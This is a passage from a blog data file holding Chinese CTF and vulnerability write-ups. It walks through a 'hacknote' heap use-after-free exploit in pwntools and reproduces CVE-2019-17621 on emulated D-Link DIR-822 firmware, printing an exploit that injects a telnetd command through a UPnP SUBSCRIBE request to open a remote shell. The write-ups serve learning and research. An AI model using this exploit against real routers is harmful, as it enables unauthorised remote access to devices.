uzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\nchunk A是申请的`note[0]`结构体的空间，chunk B是`note[0]->content`的空间\n\nchunk C、D是`note[1]`的空间\n\n由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。\n\n当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。\n\n因此`add(0x8,p32(magic))`会把magic地址写入content，调用show的时候，会直接执行这个函数。\n\n理论是如此，下面用gdb验证一下\n\n#### 调试\n\n完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist\n\n```python\nfrom pwn import *\nr = process(file_name)\nelf = ELF('./hacknote')\nmenu = 'Your choice :'\n\ndef add(size, content):\n    r.sendlineafter(menu, '1')\n    r.sendlineafter('Note size :', str(size))\n    r.sendafter('Content :', content)\n\ndef delete(index):\n    r.sendlineafter(menu, '2')\n    r.sendlineafter('Index :', str(index))\n\ndef show(index):\n    r.sendlineafter(menu, '3')\n    r.sendlineafter('Index :', str(index))\n\ndef dbg():\n    gdb.attach(r)\n\nadd(0x20, 'aaaa\\n')\nadd(0x20, 'bbbb\\n')\ndbg()\ndelete(0)\ndelete(1)\ndbg()\nmagic = 0x08048986\nadd(0x8, p32(magic))\ndbg()\nshow(0)\nr.interactive()\n```\n\n在ida中可以看到notelist的地址\n\n```assembly\n.bss:0804A070 ; void *notelist\n.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r\n.bss:0804A070                                         ; add_note+61↑w ...\n.bss:0804A074                 db    ? ;\n```\n\n查看三次notelist的内容，\n\n![](/img/UAF/1.jpg)\n\n![](/img/UAF/2.jpg)\n\n![](/img/UAF/3.jpg)\n\n可以看到，`0x92f31a0`上的地址为print_note函数的地址，在free之前，`0x92f31a4`上的内容指向下一行开头，即`aaaa`字符串，所以这里就是note[0]。\n\n在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic\n\n","slug":"ctf-pwn/堆利用 UAF","published":1,"updated":"2022-12-23T08:29:57.937Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gn000k78ufeden3hj1","content":"<h4 id=\"参考ctf-wiki\"><a href=\"#参考ctf-wiki\" class=\"headerlink\" title=\"参考ctf-wiki\"></a>参考ctf-wiki</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote\">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>\n<p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p>\n<h4 id=\"漏洞的发现\"><a href=\"#漏洞的发现\" class=\"headerlink\" title=\"漏洞的发现\"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">del_note</span><span class=\"hljs-params\">()</span> &#123;<br>  <span class=\"hljs-type\">char</span> buf[<span class=\"hljs-number\">4</span>];<br>  <span class=\"hljs-type\">int</span> idx;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Index :&quot;</span>);<br>  read(<span class=\"hljs-number\">0</span>, buf, <span class=\"hljs-number\">4</span>);<br>  idx = atoi(buf);<br>  <span class=\"hljs-keyword\">if</span> (idx &lt; <span class=\"hljs-number\">0</span> || idx &gt;= count) &#123;<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class=\"hljs-number\">0</span>);<br>  &#125;<br>  <span class=\"hljs-keyword\">if</span> (notelist[idx]) &#123;<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]-&gt;content);<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class=\"hljs-comment\">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure>\n\n<p>程序中给了system：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">magic</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h4><p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>show(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p>下面介绍这个exp的原理</p>\n<p>在delete 0和1之后fastbin结构如下图</p>\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\n<p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p>\n<p>chunk C、D是<code>note[1]</code>的空间</p>\n<p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p>\n<p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p>\n<p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p>\n<p>理论是如此，下面用gdb验证一下</p>\n<h4 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class=\"hljs-string\">&#x27;./hacknote&#x27;</span>)<br>menu = <span class=\"hljs-string\">&#x27;Your choice :&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size, content</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Note size :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(size))<br>    r.sendafter(<span class=\"hljs-string\">&#x27;Content :&#x27;</span>, content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>dbg()<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>dbg()<br>magic = <span class=\"hljs-number\">0x08048986</span><br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>dbg()<br>show(<span class=\"hljs-number\">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>在ida中可以看到notelist的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure>\n\n<p>查看三次notelist的内容，</p>\n<p><img src=\"/img/UAF/1.jpg\"></p>\n<p><img src=\"/img/UAF/2.jpg\"></p>\n<p><img src=\"/img/UAF/3.jpg\"></p>\n<p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p>\n<p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>\n","site":{"data":{}},"more":"<h4 id=\"参考ctf-wiki\"><a href=\"#参考ctf-wiki\" class=\"headerlink\" title=\"参考ctf-wiki\"></a>参考ctf-wiki</h4><p><a href=\"https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote\">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p>\n<p>以下实验所用程序（与源码）见上述链接中文件hacknote（与hacknote.c）</p>\n<h4 id=\"漏洞的发现\"><a href=\"#漏洞的发现\" class=\"headerlink\" title=\"漏洞的发现\"></a>漏洞的发现</h4><p>在<code>del_note()</code>函数中free掉指针之后没有清零：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">void</span> <span class=\"hljs-title function_\">del_note</span><span class=\"hljs-params\">()</span> &#123;<br>  <span class=\"hljs-type\">char</span> buf[<span class=\"hljs-number\">4</span>];<br>  <span class=\"hljs-type\">int</span> idx;<br>  <span class=\"hljs-built_in\">printf</span>(<span class=\"hljs-string\">&quot;Index :&quot;</span>);<br>  read(<span class=\"hljs-number\">0</span>, buf, <span class=\"hljs-number\">4</span>);<br>  idx = atoi(buf);<br>  <span class=\"hljs-keyword\">if</span> (idx &lt; <span class=\"hljs-number\">0</span> || idx &gt;= count) &#123;<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class=\"hljs-number\">0</span>);<br>  &#125;<br>  <span class=\"hljs-keyword\">if</span> (notelist[idx]) &#123;<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]-&gt;content);<br>    <span class=\"hljs-built_in\">free</span>(notelist[idx]);<br>    <span class=\"hljs-built_in\">puts</span>(<span class=\"hljs-string\">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class=\"hljs-comment\">// 并且在add_note中是根据notelist[i]是否为nullptr判断在哪个位置add新note</span><br></code></pre></td></tr></table></figure>\n\n<p>程序中给了system：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs C\"><span class=\"hljs-type\">int</span> <span class=\"hljs-title function_\">magic</span><span class=\"hljs-params\">()</span><br>&#123;<br>  <span class=\"hljs-keyword\">return</span> system(<span class=\"hljs-string\">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<h4 id=\"漏洞利用方法\"><a href=\"#漏洞利用方法\" class=\"headerlink\" title=\"漏洞利用方法\"></a>漏洞利用方法</h4><p>exp如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>show(<span class=\"hljs-number\">0</span>)<br></code></pre></td></tr></table></figure>\n\n<p>下面介绍这个exp的原理</p>\n<p>在delete 0和1之后fastbin结构如下图</p>\n<div class=\"mxgraph\" style=\"max-width:100%;border:1px solid transparent;\" data-mxgraph=\"{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\\&quot;app.diagrams.net\\&quot; modified=\\&quot;2022-11-22T16:47:04.851Z\\&quot; agent=\\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\\&quot; etag=\\&quot;xMjKslWb0NtHo6yfLEq6\\&quot; version=\\&quot;20.5.3\\&quot; type=\\&quot;device\\&quot;&gt;&lt;diagram id=\\&quot;wU8d93oxY3eO_jrvUp61\\&quot; name=\\&quot;第 1 页\\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cunmhnCohvByndnx3eOXUMU55rXdjr38ipzqOzn1Odd+pDadmuzjl2NdHqvYl8QoOqie8j7yS6hgXTj6oOo7OfVB136wMqSYvlVT/86QS3erjuwpC9ReGe/sX&lt;/diagram&gt;&lt;/mxfile&gt;&quot;,&quot;toolbar&quot;:&quot;pages zoom layers lightbox&quot;,&quot;page&quot;:0}\"></div>\n<script type=\"text/javascript\" src=\"https://app.diagrams.net/js/viewer-static.min.js\"></script>\n\n<p>chunk A是申请的<code>note[0]</code>结构体的空间，chunk B是<code>note[0]-&gt;content</code>的空间</p>\n<p>chunk C、D是<code>note[1]</code>的空间</p>\n<p>由于fastbin会把同样大小的块放在同一个链表上，因此两个0x8大小的chunk A、 chunk C会被连在一起，并且由于fastbin使用的是先进后出的单向链表，A在C下面。</p>\n<p>当申请一个content大小为0x8的新的note时，会将A和C从fastbin中取出。先malloc结构体本身，使用chunk C，然后malloc content，使用chunk A。</p>\n<p>因此<code>add(0x8,p32(magic))</code>会把magic地址写入content，调用show的时候，会直接执行这个函数。</p>\n<p>理论是如此，下面用gdb验证一下</p>\n<h4 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h4><p>完整exp，在两次add、两次delete、最后一次add之后分别attach查看notelist</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br>r = process(file_name)<br>elf = ELF(<span class=\"hljs-string\">&#x27;./hacknote&#x27;</span>)<br>menu = <span class=\"hljs-string\">&#x27;Your choice :&#x27;</span><br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size, content</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Note size :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(size))<br>    r.sendafter(<span class=\"hljs-string\">&#x27;Content :&#x27;</span>, content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">index</span>):<br>    r.sendlineafter(menu, <span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&#x27;Index :&#x27;</span>, <span class=\"hljs-built_in\">str</span>(index))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">dbg</span>():<br>    gdb.attach(r)<br><br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;aaaa\\n&#x27;</span>)<br>add(<span class=\"hljs-number\">0x20</span>, <span class=\"hljs-string\">&#x27;bbbb\\n&#x27;</span>)<br>dbg()<br>delete(<span class=\"hljs-number\">0</span>)<br>delete(<span class=\"hljs-number\">1</span>)<br>dbg()<br>magic = <span class=\"hljs-number\">0x08048986</span><br>add(<span class=\"hljs-number\">0x8</span>, p32(magic))<br>dbg()<br>show(<span class=\"hljs-number\">0</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n<p>在ida中可以看到notelist的地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs assembly\">.bss:0804A070 ; void *notelist<br>.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r<br>.bss:0804A070                                         ; add_note+61↑w ...<br>.bss:0804A074                 db    ? ;<br></code></pre></td></tr></table></figure>\n\n<p>查看三次notelist的内容，</p>\n<p><img src=\"/img/UAF/1.jpg\"></p>\n<p><img src=\"/img/UAF/2.jpg\"></p>\n<p><img src=\"/img/UAF/3.jpg\"></p>\n<p>可以看到，<code>0x92f31a0</code>上的地址为print_note函数的地址，在free之前，<code>0x92f31a4</code>上的内容指向下一行开头，即<code>aaaa</code>字符串，所以这里就是note[0]。</p>\n<p>在第三次add之后改变了note[0]原本在print_note上的函数指针，因此show(0)时会执行magic</p>\n"},{"title":"CVE-2019-17621 dlink-822 命令注入漏洞复现","date":"2022-12-17T03:10:00.000Z","excerpt":"CVE-2019-17621 dlink-822 命令注入漏洞复现","_content":"\n#### 前言\n\n第一次成功仿真一个固件并成功访问web并成功复现漏洞的exp ......\n\n期间用 firmware-analysis-toolkit 和 firmware-analysis-plus （包括它的docker）在不同的操作系统（kali2020.4，kali2022.4）上来回实验了各种各样的固件，最终的成功目前看来只是一个偶然（因为遇到了太多我目前无法解释的问题）特此记录一下😪\n\n#### 环境\n\nkali2020.4 （同样的固件，同样版本的fap，但是在kali2022.4上运行这个固件时，会Internal Error 500（但起码能访问到这个ip......😅）\n\n固件下载地址：<http://support.dlink.com.cn:9000/ProductInfo.aspx?m=DIR-822>\n\n就这一个版本1.03B03\n\n![](/img/CVE-2019-17621/1.jpg)\n\nfap使用的是2.3版本 <https://github.com/liyansong2018/firmware-analysis-plus/tree/v2.3>\n\n使用的exp来源 <https://www.jianshu.com/p/409106be87b7>\n\n#### 运行\n\n![](/img/CVE-2019-17621/2.jpg)\n\n#### exp\n\n```python\nimport socket\nimport os\nfrom time import sleep\n# Exploit By Miguel Mendez & Pablo Pollanco\ndef httpSUB(server, port, shell_file):\n    print('\\n[*] Connection {host}:{port}').format(host=server, port=port)\n    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    request = \"SUBSCRIBE /gena.cgi?service=\" + str(shell_file) + \" HTTP/1.0\\n\"\n    request += \"Host: \" + str(server) + str(port) + \"\\n\"\n    request += \"Callback: <http://192.168.0.4:34033/ServiceProxy27>\\n\"\n    request += \"NT: upnp:event\\n\"\n    request += \"Timeout: Second-1800\\n\"\n    request += \"Accept-Encoding: gzip, deflate\\n\"\n    request += \"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\"\n    sleep(1)\n    print('[*] Sending Payload')\n    con.connect((socket.gethostbyname(server),port))\n    con.send(request.encode())\n    results = con.recv(4096)\n    sleep(1)\n    print('[*] Running Telnetd Service')\n    sleep(1)\n    print('[*] Opening Telnet Connection\\n')\n    sleep(2)\n    os.system('telnet ' + str(server) + ' 9999')\nserverInput = raw_input('IP Router: ')\nportInput = 49152\nhttpSUB(serverInput, portInput, '`telnetd -p 9999 &`')\n```\n\n#### 